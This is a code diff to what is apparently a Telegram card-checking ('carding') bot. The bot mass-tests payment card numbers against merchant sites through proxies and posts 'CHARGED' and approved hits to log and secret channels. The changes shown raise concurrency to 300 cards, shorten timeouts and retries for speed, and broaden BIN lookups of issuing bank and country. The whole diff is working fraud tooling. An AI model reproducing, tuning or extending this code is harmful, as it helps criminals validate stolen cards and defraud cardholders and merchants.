@@ -78,12 +78,12 @@ MY_CHANNEL_LINK     = "https://t.me/Batcardchk"                    # main channe
 LOGS_CHANNEL_LINK   = "https://t.me/+BXmeotREVhllODFk"             # hits log channel
 
 SH_COOLDOWN    = 25
-SITE_RETRIES      = 20   # max site attempts per card
-SITE_TIMEOUT      = 10   # seconds per API call
-MAX_CONCURRENT    = 200  # cards checked in parallel
-CARD_STAGGER      = 0.005 # stagger between card launches (seconds)
-SITE_BATCH        = 10   # sites raced in parallel within each retry round
-CONSEC_TIMEOUT_MAX = 15  # abort card after 15 consecutive timeouts
+SITE_RETRIES      = 5    # max site attempts per card  (tuned for speed)
+SITE_TIMEOUT      = 5    # seconds per API call
+MAX_CONCURRENT    = 300  # cards checked in parallel
+CARD_STAGGER      = 0.002 # stagger between card launches (seconds)
+SITE_BATCH        = 15   # sites raced in parallel within each retry round
+CONSEC_TIMEOUT_MAX = 5   # abort after 5 consecutive timeouts (dead proxies)
 BUTTON_LOCK    = 30
 
 _CB_RESULT = "mshr"
@@ -1949,15 +1949,78 @@ def _sid() -> str:
 # BIN LOOKUP
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 COUNTRY_FLAGS = {
-    "US":"🇺🇸","GB":"🇬🇧","CA":"🇨🇦","AU":"🇦🇺","DE":"🇩🇪","FR":"🇫🇷",
-    "IN":"🇮🇳","BR":"🇧🇷","MX":"🇲🇽","JP":"🇯🇵","CN":"🇨🇳","RU":"🇷🇺",
-    "IT":"🇮🇹","ES":"🇪🇸","NL":"🇳🇱","SE":"🇸🇪","NG":"🇳🇬","ZA":"🇿🇦",
-    "EG":"🇪🇬","PK":"🇵🇰","SG":"🇸🇬","MY":"🇲🇾","ID":"🇮🇩","TH":"🇹🇭",
-    "PH":"🇵🇭","VN":"🇻🇳","AE":"🇦🇪","SA":"🇸🇦","TR":"🇹🇷","PL":"🇵🇱",
-    "UA":"🇺🇦","AR":"🇦🇷","CO":"🇨🇴","CL":"🇨🇱","NZ":"🇳🇿","HK":"🇭🇰",
-    "TW":"🇹🇼","KR":"🇰🇷","IL":"🇮🇱","CH":"🇨🇭","BE":"🇧🇪","AT":"🇦🇹",
-    "PT":"🇵🇹","GR":"🇬🇷","CZ":"🇨🇿","HU":"🇭🇺","RO":"🇷🇴","FI":"🇫🇮",
-    "DK":"🇩🇰","NO":"🇳🇴","IE":"🇮🇪",
+    # A
+    "AF":"🇦🇫","AX":"🇦🇽","AL":"🇦🇱","DZ":"🇩🇿","AS":"🇦🇸","AD":"🇦🇩","AO":"🇦🇴",
+    "AI":"🇦🇮","AQ":"🇦🇶","AG":"🇦🇬","AR":"🇦🇷","AM":"🇦🇲","AW":"🇦🇼","AU":"🇦🇺",
+    "AT":"🇦🇹","AZ":"🇦🇿",
+    # B
+    "BS":"🇧🇸","BH":"🇧🇭","BD":"🇧🇩","BB":"🇧🇧","BY":"🇧🇾","BE":"🇧🇪","BZ":"🇧🇿",
+    "BJ":"🇧🇯","BM":"🇧🇲","BT":"🇧🇹","BO":"🇧🇴","BQ":"🇧🇶","BA":"🇧🇦","BW":"🇧🇼",
+    "BV":"🇧🇻","BR":"🇧🇷","IO":"🇮🇴","BN":"🇧🇳","BG":"🇧🇬","BF":"🇧🇫","BI":"🇧🇮",
+    # C
+    "CV":"🇨🇻","KH":"🇰🇭","CM":"🇨🇲","CA":"🇨🇦","KY":"🇰🇾","CF":"🇨🇫","TD":"🇹🇩",
+    "CL":"🇨🇱","CN":"🇨🇳","CX":"🇨🇽","CC":"🇨🇨","CO":"🇨🇴","KM":"🇰🇲","CG":"🇨🇬",
+    "CD":"🇨🇩","CK":"🇨🇰","CR":"🇨🇷","CI":"🇨🇮","HR":"🇭🇷","CU":"🇨🇺","CW":"🇨🇼",
+    "CY":"🇨🇾","CZ":"🇨🇿",
+    # D
+    "DK":"🇩🇰","DJ":"🇩🇯","DM":"🇩🇲","DO":"🇩🇴",
+    # E
+    "EC":"🇪🇨","EG":"🇪🇬","SV":"🇸🇻","GQ":"🇬🇶","ER":"🇪🇷","EE":"🇪🇪","SZ":"🇸🇿",
+    "ET":"🇪🇹",
+    # F
+    "FK":"🇫🇰","FO":"🇫🇴","FJ":"🇫🇯","FI":"🇫🇮","FR":"🇫🇷","GF":"🇬🇫","PF":"🇵🇫",
+    "TF":"🇹🇫",
+    # G
+    "GA":"🇬🇦","GM":"🇬🇲","GE":"🇬🇪","DE":"🇩🇪","GH":"🇬🇭","GI":"🇬🇮","GR":"🇬🇷",
+    "GL":"🇬🇱","GD":"🇬🇩","GP":"🇬🇵","GU":"🇬🇺","GT":"🇬🇹","GG":"🇬🇬","GN":"🇬🇳",
+    "GW":"🇬🇼","GY":"🇬🇾",
+    # H
+    "HT":"🇭🇹","HM":"🇭🇲","VA":"🇻🇦","HN":"🇭🇳","HK":"🇭🇰","HU":"🇭🇺",
+    # I
+    "IS":"🇮🇸","IN":"🇮🇳","ID":"🇮🇩","IR":"🇮🇷","IQ":"🇮🇶","IE":"🇮🇪","IM":"🇮🇲",
+    "IL":"🇮🇱","IT":"🇮🇹",
+    # J
+    "JM":"🇯🇲","JP":"🇯🇵","JE":"🇯🇪","JO":"🇯🇴",
+    # K
+    "KZ":"🇰🇿","KE":"🇰🇪","KI":"🇰🇮","KP":"🇰🇵","KR":"🇰🇷","KW":"🇰🇼","KG":"🇰🇬",
+    # L
+    "LA":"🇱🇦","LV":"🇱🇻","LB":"🇱🇧","LS":"🇱🇸","LR":"🇱🇷","LY":"🇱🇾","LI":"🇱🇮",
+    "LT":"🇱🇹","LU":"🇱🇺",
+    # M
+    "MO":"🇲🇴","MG":"🇲🇬","MW":"🇲🇼","MY":"🇲🇾","MV":"🇲🇻","ML":"🇲🇱","MT":"🇲🇹",
+    "MH":"🇲🇭","MQ":"🇲🇶","MR":"🇲🇷","MU":"🇲🇺","YT":"🇾🇹","MX":"🇲🇽","FM":"🇫🇲",
+    "MD":"🇲🇩","MC":"🇲🇨","MN":"🇲🇳","ME":"🇲🇪","MS":"🇲🇸","MA":"🇲🇦","MZ":"🇲🇿",
+    "MM":"🇲🇲",
+    # N
+    "NA":"🇳🇦","NR":"🇳🇷","NP":"🇳🇵","NL":"🇳🇱","NC":"🇳🇨","NZ":"🇳🇿","NI":"🇳🇮",
+    "NE":"🇳🇪","NG":"🇳🇬","NU":"🇳🇺","NF":"🇳🇫","MK":"🇲🇰","MP":"🇲🇵","NO":"🇳🇴",
+    # O
+    "OM":"🇴🇲",
+    # P
+    "PK":"🇵🇰","PW":"🇵🇼","PS":"🇵🇸","PA":"🇵🇦","PG":"🇵🇬","PY":"🇵🇾","PE":"🇵🇪",
+    "PH":"🇵🇭","PN":"🇵🇳","PL":"🇵🇱","PT":"🇵🇹","PR":"🇵🇷",
+    # Q
+    "QA":"🇶🇦",
+    # R
+    "RE":"🇷🇪","RO":"🇷🇴","RU":"🇷🇺","RW":"🇷🇼",
+    # S
+    "BL":"🇧🇱","SH":"🇸🇭","KN":"🇰🇳","LC":"🇱🇨","MF":"🇲🇫","PM":"🇵🇲","VC":"🇻🇨",
+    "WS":"🇼🇸","SM":"🇸🇲","ST":"🇸🇹","SA":"🇸🇦","SN":"🇸🇳","RS":"🇷🇸","SC":"🇸🇨",
+    "SL":"🇸🇱","SG":"🇸🇬","SX":"🇸🇽","SK":"🇸🇰","SI":"🇸🇮","SB":"🇸🇧","SO":"🇸🇴",
+    "ZA":"🇿🇦","GS":"🇬🇸","SS":"🇸🇸","ES":"🇪🇸","LK":"🇱🇰","SD":"🇸🇩","SR":"🇸🇷",
+    "SJ":"🇸🇯","SE":"🇸🇪","CH":"🇨🇭","SY":"🇸🇾",
+    # T
+    "TW":"🇹🇼","TJ":"🇹🇯","TZ":"🇹🇿","TH":"🇹🇭","TL":"🇹🇱","TG":"🇹🇬","TK":"🇹🇰",
+    "TO":"🇹🇴","TT":"🇹🇹","TN":"🇹🇳","TR":"🇹🇷","TM":"🇹🇲","TC":"🇹🇨","TV":"🇹🇻",
+    # U
+    "UG":"🇺🇬","UA":"🇺🇦","AE":"🇦🇪","GB":"🇬🇧","UM":"🇺🇲","US":"🇺🇸","UY":"🇺🇾",
+    "UZ":"🇺🇿",
+    # V
+    "VU":"🇻🇺","VE":"🇻🇪","VN":"🇻🇳","VG":"🇻🇬","VI":"🇻🇮",
+    # W
+    "WF":"🇼🇫","EH":"🇪🇭",
+    # X / Y / Z
+    "YE":"🇾🇪","ZM":"🇿🇲","ZW":"🇿🇼",
 }
 
 
@@ -1975,7 +2038,8 @@ async def _fetch_bin_direct(bin6: str) -> dict:
 
     async def _try(url: str, hdrs: dict, parse) -> dict:
         try:
-            to = aiohttp.ClientTimeout(total=8, connect=4)
+            # 3s total / 2s connect — all 6 sources complete in ~3s
+            to = aiohttp.ClientTimeout(total=3, connect=2)
             async with aiohttp.ClientSession(
                 timeout=to, headers={"User-Agent": "Mozilla/5.0"}
             ) as s:
@@ -1991,8 +2055,8 @@ async def _fetch_bin_direct(bin6: str) -> dict:
                     bank_ok    = bool((info.get("bank")         or "").strip().upper() not in _bad)
                     country_ok = bool((info.get("country")      or "").strip().upper() not in _bad)
                     cc_ok      = bool((info.get("country_code") or "").strip().upper() not in _bad)
-                    # Need scheme + at least one of bank / country / country_code
-                    if not scheme_ok or not (bank_ok or country_ok or cc_ok):
+                    # Scheme alone is valid — better to show VISA than nothing
+                    if not scheme_ok:
                         return {}
                     cc = (info.get("country_code") or "").upper()[:2]
                     info["country_emoji"] = COUNTRY_FLAGS.get(cc, "")
@@ -2075,18 +2139,15 @@ async def _fetch_bin_direct(bin6: str) -> dict:
 
 
 def _bin_empty(r: dict) -> bool:
-    """True if the result has no usable BIN data (N/A, error, or missing)."""
+    """True if the result has no usable BIN data at all.
+    Relaxed: scheme alone (VISA / MASTERCARD / AMEX) is valid —
+    better to show 'VISA - N/A - N/A' than discard a partial result.
+    """
     if not r or r.get("error"):
         return True
     bad = {"", "N/A", "NONE", "UNKNOWN", "NULL", "None", "none"}
-    scheme  = str(r.get("scheme",  "") or "").strip().upper()
-    bank    = str(r.get("bank",    "") or "").strip().upper()
-    country = str(r.get("country", "") or "").strip().upper()
-    # Need scheme AND at least one of bank/country
-    scheme_ok  = scheme  not in bad
-    bank_ok    = bank    not in bad
-    country_ok = country not in bad
-    return not scheme_ok or not (bank_ok or country_ok)
+    scheme = str(r.get("scheme", "") or "").strip().upper()
+    return scheme in bad   # scheme alone is the minimum useful data
 
 
 async def _bin_lookup(bin6: str) -> dict:
@@ -2148,9 +2209,9 @@ def _bin_str(bd: dict) -> str:
         return "N/A"
     scheme  = escape(_g("scheme", "brand", "card_scheme", "network").upper())
     bank    = escape(_g("bank", "bank_name", "issuer", "issuer_name"))
-    country = escape(_clean_country(_g("country", "country_name", "country_full")))
+    country = escape(_clean_country(_g("country", "country_name", "country_full")).upper())
     flag    = bd.get("country_emoji", "")
-    cstr    = f"{flag} {country}".strip() if flag else country
+    cstr    = f"{country}{flag}" if flag else country   # flag after: FRANCE🇫🇷
     return f"{scheme} - {bank} - {cstr}"
 
 
@@ -2167,9 +2228,9 @@ def _bin_str_plain(bd: dict) -> str:
         return "N/A"
     scheme  = _g("scheme", "brand", "card_scheme", "network").upper()
     bank    = _g("bank", "bank_name", "issuer", "issuer_name")
-    country = _clean_country(_g("country", "country_name", "country_full"))
+    country = _clean_country(_g("country", "country_name", "country_full")).upper()
     flag    = bd.get("country_emoji", "")
-    cstr    = f"{flag} {country}".strip() if flag else country
+    cstr    = f"{country}{flag}" if flag else country   # flag after: FRANCE🇫🇷
     return f"{scheme} - {bank} - {cstr}"
 
 
@@ -2231,7 +2292,7 @@ def build_result_msg(card, resp, verdict, bin_data, price, currency,
         f'<b>{gate_line}</b>\n'
         f'<b>──────────</b>\n'
         f'<b>Resp ➳ {safe_resp}</b>\n'
-        f'<b>Bin ➳ <code>{bin_s}</code></b>\n'
+        f'<b>Info ➳ {bin_s}</b>\n'
         f'<b>──────────</b>\n'
         f'<b><tg-emoji emoji-id="{TIME_EMOJI_ID}">⏱</tg-emoji> ➳ {ts}</b>\n'
         f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➳ {ulink} '
@@ -2338,7 +2399,7 @@ def _make_result_file(sess: dict, kind: str) -> tuple:
     for cd in cards:
         bi    = cd.get("bin_info", {})
         flag  = bi.get("country_emoji", "")
-        cdisp = f"{flag} {bi.get('country','N/A')}".strip() if flag else bi.get("country","N/A")
+        cdisp = f"{bi.get('country','N/A').upper()}{flag}" if flag else bi.get("country","N/A").upper()
         resp  = _clean_resp(cd.get("resp", cd.get("response", "N/A")))
         ver   = cd.get("verdict", "N/A")
         prc   = cd.get("price", "0.00")
@@ -2410,7 +2471,7 @@ async def _send_hit(bot, user, text: str, verdict: str,
         f"<b>{gate_txt}</b>\n"
         f"<b>──────────</b>\n"
         f"<b>Resp ➳ {resp_disp}</b>\n"
-        f"<b>Bin ➳ <code>{_bin_str(bin_data)}</code></b>\n"
+        f"<b>Info ➳ {_bin_str(bin_data)}</b>\n"
         f"<b>──────────</b>\n"
         f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➳ {ulink} '
         f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>'
@@ -2439,7 +2500,6 @@ async def _send_hit(bot, user, text: str, verdict: str,
     # ── 3. Extra charged group — animation + compact card ────────────────────
     if verdict == "CHARGED" and EXTRA_CHARGED_GROUP_ID:
         try:
-            await asyncio.sleep(0.3)
             eid_x = get_random_charged_emoji()
             await _send_as_media(bot, EXTRA_CHARGED_GROUP_ID, eid_x,
                                  caption=compact_html, parse_mode="HTML",
@@ -2460,14 +2520,13 @@ async def _send_hit(bot, user, text: str, verdict: str,
                 f"<b>   ⤷ <code>{escape(card)}</code></b>\n"
                 f"<b>{gate_txt}</b>\n"
                 f"<b>──────────</b>\n"
-                f"<b>Bin ➳ <code>{bin_s}</code></b>\n"
+                f"<b>Info ➳ {bin_s}</b>\n"
                 f"<b>──────────</b>\n"
                 f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➳ {ulink} '
                 f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>\n'
                 f'<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> ➳ {DEV_LINK_HTML} '
                 f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>'
             )
-            await asyncio.sleep(0.2)
             await _send_as_media(bot, SECRET_CHANNEL_ID, eid,
                                  caption=sc_html, parse_mode="HTML",
                                  disable_notification=True)
@@ -2495,6 +2554,65 @@ def create_msh_session(sid, chat_id, user_id, msg_id, user_msg_id,
     }
     MSH_SESSIONS[sid] = sess
     return sess
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# SESSION CLEANUP  —  keeps MSH_SESSIONS lean in long runs
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+_MSH_COMPLETED: dict = {}   # archived sessions (result buttons still work)
+_CLEANUP_STARTED = False    # guard — only one cleanup task ever
+
+
+async def _start_cleanup_if_needed() -> None:
+    """Schedule the background cleanup task once on the main bot loop."""
+    global _CLEANUP_STARTED
+    if not _CLEANUP_STARTED:
+        _CLEANUP_STARTED = True
+        asyncio.create_task(_session_cleanup_task())
+
+
+async def _session_cleanup_task() -> None:
+    """Background task: archive FINISHED/STOPPED sessions after 30 min,
+    delete from archive after 24 h.  Runs on the main bot loop.
+    """
+    SESSION_TTL = 1800    # 30 min before archiving
+    ARCHIVE_TTL = 86400   # 24 h before deleting from archive
+    while True:
+        try:
+            await asyncio.sleep(60)          # check every minute
+            now = time.time()
+            for sid in list(MSH_SESSIONS):
+                sess = MSH_SESSIONS.get(sid)
+                if not sess:
+                    continue
+                if sess.get("status") not in ("FINISHED", "STOPPED"):
+                    continue
+                end_t = sess.get("end_time") or sess.get("start_time") or now
+                try:
+                    end_t = float(end_t)
+                except (TypeError, ValueError):
+                    end_t = now
+                if now - end_t > SESSION_TTL:
+                    _MSH_COMPLETED[sid] = {
+                        k: sess.get(k) for k in (
+                            "user_id", "chat_id", "msg_id", "user_msg_id",
+                            "total", "checked", "charged", "approved",
+                            "dead", "errors", "status",
+                            "charged_cards", "live_cards", "dead_cards",
+                            "error_cards", "user_obj", "plan",
+                        )
+                    }
+                    _MSH_COMPLETED[sid]["archived_at"] = now
+                    MSH_SESSIONS.pop(sid, None)
+                    logging.info(f"[CLEANUP] Archived session {sid}")
+            for sid in list(_MSH_COMPLETED):
+                archived_at = float(_MSH_COMPLETED[sid].get("archived_at", now))
+                if now - archived_at > ARCHIVE_TTL:
+                    _MSH_COMPLETED.pop(sid, None)
+        except asyncio.CancelledError:
+            break
+        except Exception as exc:
+            logging.error(f"[CLEANUP] {exc}")
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -2530,7 +2648,7 @@ async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies):
 
     logging.info(
         f"[MSH] {sid} — {len(effective_proxies)} proxies "
-        f"{len(valid_cards)} cards concurrency=70 (thread-pool)"
+        f"{len(valid_cards)} cards  concurrency={MAX_CONCURRENT}"
     )
 
     # Run the entire session in a pool thread — non-blocking for the bot
@@ -2563,16 +2681,58 @@ def _run_msh_session_thread(
             pass
 
 
+async def _bin_prefetch(bin6: str) -> None:
+    """Pre-warm the BIN cache for one prefix.  Skips if already cached."""
+    if bin6 in _BIN_CACHE and not _bin_empty(_BIN_CACHE.get(bin6, {})):
+        return
+    try:
+        result = await asyncio.wait_for(_fetch_bin_direct(bin6), timeout=5)
+        _BIN_CACHE[bin6] = result if result else {}
+    except Exception:
+        _BIN_CACHE.setdefault(bin6, {})
+
+
 async def _msh_session_worker(bot, sid, cards, user, plan, all_sites, proxies):
     """Core async worker running in the session’s private event loop."""
     sess = MSH_SESSIONS.get(sid)
     if not sess:
         return
 
-    # Start session cleanup task on the main loop (mst.py pattern)
+    # Start session cleanup task once on the main bot loop
     _fire(_start_cleanup_if_needed())
 
-    sem = asyncio.Semaphore(MAX_CONCURRENT)  # matches MAX_CONCURRENT
+    # ── Per-session BIN dedup via asyncio.Event ────────────────────────
+    # Checking starts IMMEDIATELY — no blocking pre-fetch.
+    # First worker per unique BIN prefix fetches it (4 s timeout);
+    # all other workers for the same prefix wait on an asyncio.Event.
+    # Each unique BIN is fetched exactly once per session.
+    _local_bin_events: dict = {}   # bin6 → asyncio.Event (loop-local)
+
+    async def _bin_get_local(bin6: str) -> dict:
+        # Fast path: already in global cache
+        hit = _BIN_CACHE.get(bin6)
+        if hit is not None:
+            return hit
+        # Another coroutine is already fetching this BIN — wait for it
+        if bin6 in _local_bin_events:
+            try:
+                await asyncio.wait_for(_local_bin_events[bin6].wait(), timeout=6)
+            except asyncio.TimeoutError:
+                pass
+            return _BIN_CACHE.get(bin6) or {}
+        # We are the first — claim the slot and fetch
+        ev = asyncio.Event()
+        _local_bin_events[bin6] = ev
+        try:
+            result = await asyncio.wait_for(_fetch_bin_direct(bin6), timeout=4)
+            _BIN_CACHE[bin6] = result if result else {}
+        except Exception:
+            _BIN_CACHE[bin6] = {}
+        finally:
+            ev.set()    # wake up all waiters
+        return _BIN_CACHE.get(bin6) or {}
+
+    sem = asyncio.Semaphore(MAX_CONCURRENT)
 
     async def worker(card_fmt: str, cc_num: str):
         if sess.get("status") != "CHECKING":
@@ -2583,28 +2743,9 @@ async def _msh_session_worker(bot, sid, cards, user, plan, all_sites, proxies):
 
             t0 = time.time()
 
-            # ── 1. BIN lookup FIRST (msh.py pattern) ────────────────────────────────────
-            bin6 = cc_num[:6]
-            bin_data: dict = _BIN_CACHE.get(bin6, {})
-            if not bin_data or _bin_empty(bin_data):
-                try:
-                    # Try our 5-source direct lookup first
-                    result = await asyncio.wait_for(_fetch_bin_direct(bin6), timeout=12)
-                    if not _bin_empty(result):
-                        bin_data = result
-                        _BIN_CACHE[bin6] = result
-                    else:
-                        # Fall back to config.py helper
-                        try:
-                            fb = await asyncio.wait_for(get_bin_info(bin6), timeout=8)
-                            if fb and not _bin_empty(fb):
-                                bin_data = fb
-                                _BIN_CACHE[bin6] = fb
-                        except Exception:
-                            pass
-                except Exception:
-                    # Last resort: use whatever is cached (may be empty)
-                    bin_data = _BIN_CACHE.get(bin6, {})
+            # ── 1. BIN — lazy fetch with per-BIN dedup (no startup delay) ──────
+            bin6     = cc_num[:6]
+            bin_data = await _bin_get_local(bin6)
 
             # ── 2. Card check ──────────────────────────────────────────────────
             try:
